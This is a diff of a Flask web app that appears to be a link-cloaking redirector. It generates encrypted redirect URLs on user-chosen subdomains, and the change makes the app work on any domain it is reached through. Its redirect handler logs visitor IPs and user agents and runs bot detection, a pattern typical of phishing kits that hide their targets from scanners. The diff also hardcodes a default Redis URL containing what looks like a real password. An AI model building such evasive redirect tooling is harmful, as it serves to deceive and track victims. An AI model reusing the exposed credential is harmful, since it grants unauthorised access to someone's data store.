@@ -34,10 +34,27 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 logger.debug("Initializing Flask app")
 
+# Environment variables
+FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(32))
+ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", secrets.token_bytes(32))
+HMAC_KEY = os.getenv("HMAC_KEY", secrets.token_bytes(32))
+REDIS_URL = os.getenv("REDIS_URL", "redis://:AZSFAAIjcDEwMzUzMTExOTI5NDY0ZTY4OWVmYWE4NzFmZjNkMzcyNXAxMA@kind-ferret-38021.upstash.io:6379")
+MAXMIND_KEY = os.getenv("MAXMIND_KEY", "")
+USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/<repo>/main/user.txt")  # Replace <repo>
+DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
+
+# Dynamic domain handling
+def get_base_domain():
+    host = request.host
+    # Extract base domain (e.g., nvclerks.com or anotherdomain.com)
+    parts = host.split('.')
+    if len(parts) >= 2:
+        return '.'.join(parts[-2:])
+    return host
+
 # Configuration
 try:
-    app.config['SERVER_NAME'] = os.getenv('SERVER_NAME', 'nvclerks.com')
-    app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', secrets.token_hex(32))
+    app.config['SECRET_KEY'] = FLASK_SECRET_KEY
     app.config['SESSION_COOKIE_HTTPONLY'] = True
     app.config['SESSION_COOKIE_SECURE'] = True
     app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
@@ -46,19 +63,11 @@ except Exception as e:
     logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
     raise
 
-# Environment variables
-ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", secrets.token_bytes(32))
-HMAC_KEY = os.getenv("HMAC_KEY", secrets.token_bytes(32))
-REDIS_URL = os.getenv("REDIS_URL", "")
-MAXMIND_KEY = os.getenv("MAXMIND_KEY", "")
-USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/<repo>/main/user.txt")  # Replace <repo>
-BASE_DOMAIN = os.getenv("BASE_DOMAIN", "nvclerks.com")
-DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
-
 # Log environment variables
-logger.debug(f"ENCRYPTION_KEY: {'set' if ENCRYPTION_KEY else 'not set'}")
-logger.debug(f"HMAC_KEY: {'set' if HMAC_KEY else 'not set'}")
-logger.debug(f"REDIS_URL: {REDIS_URL[:50] if REDIS_URL else 'not set'}...")
+logger.debug(f"FLASK_SECRET_KEY: {'set' if os.getenv('FLASK_SECRET_KEY') else 'auto-generated'}")
+logger.debug(f"ENCRYPTION_KEY: {'set' if os.getenv('ENCRYPTION_KEY') else 'auto-generated'}")
+logger.debug(f"HMAC_KEY: {'set' if os.getenv('HMAC_KEY') else 'auto-generated'}")
+logger.debug(f"REDIS_URL: {REDIS_URL[:50]}...")
 logger.debug(f"MAXMIND_KEY: {'set' if MAXMIND_KEY else 'not set'}")
 logger.debug(f"USER_TXT_URL: {USER_TXT_URL}")
 
@@ -427,7 +436,7 @@ def login():
 @rate_limit(limit=5, per=60)
 def index():
     try:
-        logger.debug(f"Accessing root URL, session: {'username' in session}")
+        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
         if 'username' in session:
             logger.debug(f"User {session['username']} redirecting to dashboard")
             return redirect(url_for('dashboard'))
@@ -443,7 +452,8 @@ def index():
 def dashboard():
     try:
         username = session['username']
-        logger.debug(f"Accessing dashboard for user: {username}")
+        base_domain = get_base_domain()
+        logger.debug(f"Accessing dashboard for user: {username}, base_domain: {base_domain}")
         error = None
         if request.method == "POST":
             subdomain = request.form.get("subdomain", "default")
@@ -495,7 +505,7 @@ def dashboard():
                     error = "Failed to encrypt payload"
 
                 if not error:
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
+                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
                     url_id = hashlib.sha256(generated_url.encode()).hexdigest()
                     if redis_client:
                         redis_client.hset(f"user:{username}:url:{url_id}", mapping={
@@ -801,10 +811,11 @@ def fingerprint():
 @rate_limit(limit=5, per=60)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment):
     try:
+        base_domain = get_base_domain()
         user_agent = request.headers.get("User-Agent", "")
         ip = request.remote_addr
         headers = request.headers
-        logger.debug(f"Redirect handler for {username}.{BASE_DOMAIN}/{endpoint}, IP: {ip}, User-Agent: {user_agent}")
+        logger.debug(f"Redirect handler for {username}.{base_domain}/{endpoint}, IP: {ip}, User-Agent: {user_agent}")
 
         # Bot detection
         is_bot_flag, bot_reason = is_bot(user_agent, headers)
